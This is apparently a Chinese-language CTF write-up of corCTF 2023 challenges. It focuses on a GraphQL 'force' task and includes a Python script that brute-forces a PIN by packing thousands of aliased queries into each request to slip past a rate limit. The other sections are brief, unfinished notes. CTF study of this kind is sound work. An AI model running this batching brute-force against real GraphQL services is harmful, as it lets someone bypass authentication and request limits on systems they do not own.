# web
### force
#GraphQL
核心代码
```js
const secret = randomInt(0, 10 ** 5); // 1 in a 100k??
await app.register(mercurius, {
    schema: `type Query {
        flag(pin: Int): String
    }`,
    resolvers: {
        Query: {
            flag: (_, { pin }) => {
                if (pin != secret) {
                    return 'Wrong!';
                }
                return process.env.FLAG || 'corctf{test}';
            }
        }
    },
    routes: false
});
```
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230801191544.png)
要让传进去的flag\=\=一个随机数 ,而且限制了最大request,无法爆破

```http
POST / HTTP/1.1
Host: web-force-force-071653fc1aff533c.be.ax
Content-Length: 20
Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: text/plain
Accept: */*
Origin: https://web-force-force-328a9076b0a2deb6.be.ax
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://web-force-force-328a9076b0a2deb6.be.ax/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
    flag(pin:11)
}
```

不知道怎么绕过...

---

GraphQL的特性是支持一条http请求里执行多个查询也就是`batch query`
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#batching-attacks
```python
{
batch1:flag(pin:0)

batch2:flag(pin:1)
}
```

*python*
```python
import requests
import json

min = 0
max = 10000

def batch_loop(min, max):
    data = ''
    for x in range(min,max,1):
        data = data + f'batch{x+1}:flag(pin:{x})\r\n'

    return data
    
headers = {
    'Content-Type': 'text/plain;charset=UTF-8'
}



while True:
    data = batch_loop(min, max)
    data_g = '{\n'+data+'\n}'
    
    r = requests.post('http://localhost:8090',headers=headers,data=data_g)
    
    if 'corctf' in r.text:
        jsonFormat = json.loads(r.text)
        for key, val in jsonFormat['data'].items():
            if val != 'Wrong!':
                print(f'flag: {val}')
        break
        
    min = min + 10000
    max = max + 10000

    if max > 100000:
        print('failed.')
        break
    else:
        print('retrying...')
```

### msfrognymize
一个上传图片后对可以对人脸进行打码的网站


# reverse
### utterly-deranged
直接f5会提示`too big function`,修改配置文件里的选项,还是不行,反编译半天

# pwn

# crypto

# Misc


---
# *相关wp*




2023-08-01   19:14